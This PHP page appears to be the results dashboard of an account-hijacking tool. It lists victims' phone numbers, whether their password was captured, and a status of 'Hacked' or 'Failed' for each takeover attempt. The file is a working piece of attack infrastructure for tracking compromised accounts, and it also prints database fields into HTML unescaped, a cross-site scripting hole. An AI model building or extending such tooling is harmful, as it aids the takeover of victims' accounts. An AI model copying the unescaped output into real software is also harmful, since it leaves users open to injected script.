<?php

$sql = $c->query("SELECT * FROM result"); 
if ($sql->num_rows == 0) {
	?>
	<center>
		<div style="margin-top: 15%;font-size: 23px;color: grey"> <i class="fa fa-warning"></i> No History</div>
	</center>
	<?php
}else {
	?>
	<div class="container">
		<table class="w-100 mt-5 table table-striped table-inverse table-hover">
			<thead>
				<tr>
					<th>No</th>
					<th>Phone</th>
					<th>Password</th>
					<th>Status</th>
					<th>Date</th>
				</tr>
			</thead>
			<tbody>
		<?php
		$cog = new cog();
		while ($exe = $sql->fetch_array()) {
			if ($exe['password'] == 'Yes') {
				$password = "Yes";
			}else if ($exe['password'] == 'No'){
				$password = "No";
			}else{
				$password = "Unknown";
			}
			$timeplus = $exe['timer'] + 60 * 10; // 10 min
			if ($exe['status'] == 1) {
				$status = "Hacked";
			}else if($exe['status'] == 0 && $timeplus < time()) {
				$status = "Failed";
			}else {
				$status = "Unknown";
			}
			$st_style = ($exe['status'] == 1) ? 'text-success' : 'text-danger';
			echo '	<tr>
						<td>'.$exe['id'].'</td>
						<td>'.$exe['phone'].'</td>
						<td>'.$password.'</td>
						<td class="'.$st_style.'">'.$status.'</td>
						<td>'.$cog->time_ago($exe['timer']).'</td>
					</tr>';
				}
			?>
			</tbody>
		</table>
	</div>
	<?php
}



?>